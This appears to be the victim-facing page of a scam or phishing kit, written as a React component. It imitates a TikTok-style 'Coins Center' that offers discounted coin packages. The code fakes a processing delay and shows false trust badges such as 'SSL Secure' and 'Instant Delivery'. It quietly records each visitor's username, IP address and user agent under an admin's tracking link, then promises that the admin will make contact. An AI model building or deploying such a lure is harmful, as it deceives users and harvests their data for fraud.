import { useState, useEffect } from 'react'
import { useParams } from 'react-router-dom'
import { motion, AnimatePresence } from 'framer-motion'
import { Coins, User, CheckCircle, Loader2, Sparkles, Crown, Gem, Star, Zap } from 'lucide-react'
import { getLinkBySlug, addCapture, getClientInfo } from '../lib/storage'

const coinPackages = [
  { amount: 100, price: '$0.99', icon: Coins, color: 'from-pink-500 to-rose-600', bonus: '+0' },
  { amount: 500, price: '$4.99', icon: Gem, color: 'from-cyan-400 to-teal-500', bonus: '+25' },
  { amount: 1000, price: '$9.99', icon: Star, color: 'from-purple-500 to-indigo-600', bonus: '+100' },
  { amount: 2000, price: '$19.99', icon: Crown, color: 'from-amber-400 to-orange-500', bonus: '+300' },
  { amount: 5000, price: '$49.99', icon: Zap, color: 'from-red-500 to-pink-600', bonus: '+1000' },
  { amount: 10000, price: '$99.99', icon: Sparkles, color: 'from-emerald-400 to-green-500', bonus: '+3000' },
]

export default function UserPanel() {
  const { adminId, linkSlug } = useParams<{ adminId: string; linkSlug: string }>()
  const [username, setUsername] = useState('')
  const [selectedCoins, setSelectedCoins] = useState<number | null>(null)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isSuccess, setIsSuccess] = useState(false)
  const [adminMessage, setAdminMessage] = useState('Please wait 24 hours. Admin will contact you soon.')
  const [isValidLink, setIsValidLink] = useState(true)
  const [shakeUsername, setShakeUsername] = useState(false)

  useEffect(() => {
    if (adminId && linkSlug) {
      const link = getLinkBySlug(adminId, linkSlug)
      if (!link) {
        setIsValidLink(false)
      } else {
        setAdminMessage(link.customMessage || 'Please wait 24 hours. Admin will contact you soon.')
      }
    }
  }, [adminId, linkSlug])

  // Refresh admin message periodically
  useEffect(() => {
    const interval = setInterval(() => {
      if (adminId && linkSlug) {
        const link = getLinkBySlug(adminId, linkSlug)
        if (link) {
          setAdminMessage(link.customMessage || 'Please wait 24 hours. Admin will contact you soon.')
        }
      }
    }, 3000)
    return () => clearInterval(interval)
  }, [adminId, linkSlug])

  const handleSubmit = async () => {
    if (!username.trim()) {
      setShakeUsername(true)
      setTimeout(() => setShakeUsername(false), 500)
      return
    }
    if (!selectedCoins) {
      return
    }

    setIsSubmitting(true)

    // Simulate processing delay
    await new Promise(resolve => setTimeout(resolve, 2000))

    // Capture data
    if (adminId && linkSlug) {
      const clientInfo = getClientInfo()
      addCapture(adminId, linkSlug, {
        username: username.trim(),
        coinAmount: selectedCoins,
        ipAddress: clientInfo.ip,
        userAgent: clientInfo.userAgent,
        status: 'New',
      })
    }

    setIsSubmitting(false)
    setIsSuccess(true)
  }

  if (!isValidLink) {
    return (
      <div className="min-h-screen bg-[#0f0f0f] flex items-center justify-center p-4">
        <motion.div
          initial={{ scale: 0.8, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          className="text-center"
        >
          <div className="w-20 h-20 rounded-full bg-red-500/20 flex items-center justify-center mx-auto mb-6">
            <Zap className="w-10 h-10 text-red-500" />
          </div>
          <h1 className="text-2xl font-bold text-white mb-2">Link Expired</h1>
          <p className="text-gray-400">This recharge link is no longer valid.</p>
        </motion.div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-[#0f0f0f] text-white overflow-x-hidden">
      {/* Animated Background */}
      <div className="fixed inset-0 pointer-events-none overflow-hidden">
        <div className="absolute top-[-10%] left-[-10%] w-[50%] h-[50%] rounded-full bg-pink-500/5 blur-[120px]" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[50%] h-[50%] rounded-full bg-cyan-400/5 blur-[120px]" />
        <div className="absolute top-[40%] left-[50%] w-[30%] h-[30%] rounded-full bg-purple-500/5 blur-[100px]" />
      </div>

      {/* Header */}
      <motion.header
        initial={{ y: -50, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        transition={{ duration: 0.5 }}
        className="relative z-10 bg-black/50 backdrop-blur-md border-b border-white/5"
      >
        <div className="max-w-lg mx-auto px-4 py-4 flex items-center justify-center gap-3">
          <motion.div
            animate={{ rotate: [0, 10, -10, 0] }}
            transition={{ duration: 2, repeat: Infinity, repeatDelay: 3 }}
          >
            <Coins className="w-8 h-8 text-[#fe2c55]" />
          </motion.div>
          <div>
            <h1 className="text-xl font-bold gradient-text">Coins Center</h1>
            <p className="text-xs text-gray-500">Recharge your account</p>
          </div>
        </div>
      </motion.header>

      {/* Main Content */}
      <main className="relative z-10 max-w-lg mx-auto px-4 py-8">
        <AnimatePresence mode="wait">
          {!isSuccess ? (
            <motion.div
              key="form"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0, x: -50 }}
              className="space-y-6"
            >
              {/* Username Input */}
              <motion.div
                initial={{ y: 20, opacity: 0 }}
                animate={{ y: 0, opacity: 1 }}
                transition={{ delay: 0.1 }}
              >
                <label className="block text-sm font-medium text-gray-400 mb-2">
                  Enter Your Username
                </label>
                <div className={`relative ${shakeUsername ? 'animate-shake' : ''}`}>
                  <User className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-500" />
                  <input
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    placeholder="@username"
                    className="w-full h-14 bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl pl-12 pr-4 text-white placeholder-gray-600 focus:outline-none focus:border-[#fe2c55] focus:ring-1 focus:ring-[#fe2c55] transition-all"
                  />
                </div>
              </motion.div>

              {/* Coin Selection */}
              <motion.div
                initial={{ y: 20, opacity: 0 }}
                animate={{ y: 0, opacity: 1 }}
                transition={{ delay: 0.2 }}
              >
                <label className="block text-sm font-medium text-gray-400 mb-3">
                  Select Coins Amount
                </label>
                <div className="grid grid-cols-2 gap-3">
                  {coinPackages.map((pkg, index) => {
                    const Icon = pkg.icon
                    const isSelected = selectedCoins === pkg.amount
                    return (
                      <motion.button
                        key={pkg.amount}
                        initial={{ scale: 0.8, opacity: 0 }}
                        animate={{ scale: 1, opacity: 1 }}
                        transition={{ delay: 0.1 * index + 0.3 }}
                        whileHover={{ scale: 1.05 }}
                        whileTap={{ scale: 0.95 }}
                        onClick={() => setSelectedCoins(pkg.amount)}
                        className={`relative p-4 rounded-xl border-2 transition-all duration-300 ${
                          isSelected
                            ? 'coin-card-selected bg-[#1a1a1a]'
                            : 'border-[#2c2c2c] bg-[#151515] hover:border-[#3c3c3c]'
                        }`}
                      >
                        {pkg.bonus !== '+0' && (
                          <span className="absolute -top-2 -right-2 bg-gradient-to-r from-pink-500 to-rose-600 text-white text-[10px] font-bold px-2 py-0.5 rounded-full">
                            {pkg.bonus}
                          </span>
                        )}
                        <div className={`w-10 h-10 rounded-lg bg-gradient-to-r ${pkg.color} flex items-center justify-center mb-2`}>
                          <Icon className="w-5 h-5 text-white" />
                        </div>
                        <div className="text-lg font-bold text-white">{pkg.amount.toLocaleString()}</div>
                        <div className="text-xs text-gray-500">{pkg.price}</div>
                      </motion.button>
                    )
                  })}
                </div>
              </motion.div>

              {/* Admin Message */}
              <motion.div
                initial={{ y: 20, opacity: 0 }}
                animate={{ y: 0, opacity: 1 }}
                transition={{ delay: 0.5 }}
                className="bg-[#1a1a1a] border border-[#2c2c2c] rounded-xl p-4"
              >
                <div className="flex items-center gap-2 mb-1">
                  <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
                  <span className="text-xs text-gray-500">Admin Message</span>
                </div>
                <p className="text-sm text-gray-300">{adminMessage}</p>
              </motion.div>

              {/* Submit Button */}
              <motion.div
                initial={{ y: 20, opacity: 0 }}
                animate={{ y: 0, opacity: 1 }}
                transition={{ delay: 0.6 }}
              >
                <motion.button
                  whileHover={{ scale: 1.02 }}
                  whileTap={{ scale: 0.98 }}
                  onClick={handleSubmit}
                  disabled={isSubmitting}
                  className="w-full h-14 bg-gradient-to-r from-[#fe2c55] to-[#ff6b81] rounded-xl font-bold text-white text-lg shadow-lg shadow-pink-500/25 disabled:opacity-70 flex items-center justify-center gap-2 transition-all"
                >
                  {isSubmitting ? (
                    <>
                      <Loader2 className="w-5 h-5 animate-spin" />
                      Processing...
                    </>
                  ) : (
                    <>
                      <Zap className="w-5 h-5" />
                      Recharge Now
                    </>
                  )}
                </motion.button>
              </motion.div>

              {/* Security Badges */}
              <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ delay: 0.8 }}
                className="flex items-center justify-center gap-4 text-xs text-gray-600"
              >
                <span className="flex items-center gap-1">
                  <div className="w-1.5 h-1.5 rounded-full bg-green-500" />
                  SSL Secure
                </span>
                <span className="flex items-center gap-1">
                  <div className="w-1.5 h-1.5 rounded-full bg-green-500" />
                  24/7 Support
                </span>
                <span className="flex items-center gap-1">
                  <div className="w-1.5 h-1.5 rounded-full bg-green-500" />
                  Instant Delivery
                </span>
              </motion.div>
            </motion.div>
          ) : (
            <motion.div
              key="success"
              initial={{ opacity: 0, y: 50 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.5 }}
              className="text-center py-12"
            >
              <motion.div
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                transition={{ delay: 0.2, type: 'spring', stiffness: 200 }}
                className="w-24 h-24 rounded-full bg-gradient-to-r from-green-400 to-emerald-500 flex items-center justify-center mx-auto mb-6"
              >
                <CheckCircle className="w-12 h-12 text-white" />
              </motion.div>
              <motion.h2
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.4 }}
                className="text-2xl font-bold text-white mb-2"
              >
                Order Submitted!
              </motion.h2>
              <motion.p
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.5 }}
                className="text-gray-400 mb-2"
              >
                Your information has been submitted successfully.
              </motion.p>
              <motion.p
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.6 }}
                className="text-gray-500 text-sm"
              >
                Please wait 24 hours. Admin will contact you soon.
              </motion.p>

              {/* Decorative elements */}
              <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ delay: 0.8 }}
                className="mt-8 flex justify-center gap-2"
              >
                {[...Array(3)].map((_, i) => (
                  <motion.div
                    key={i}
                    animate={{ y: [0, -10, 0] }}
                    transition={{ duration: 1.5, delay: i * 0.2, repeat: Infinity }}
                    className="w-2 h-2 rounded-full bg-gradient-to-r from-pink-500 to-cyan-400"
                  />
                ))}
              </motion.div>
            </motion.div>
          )}
        </AnimatePresence>
      </main>

      {/* Footer */}
      <footer className="relative z-10 text-center py-6 text-xs text-gray-700">
        <p>Coins Center. All rights reserved.</p>
      </footer>
    </div>
  )
}
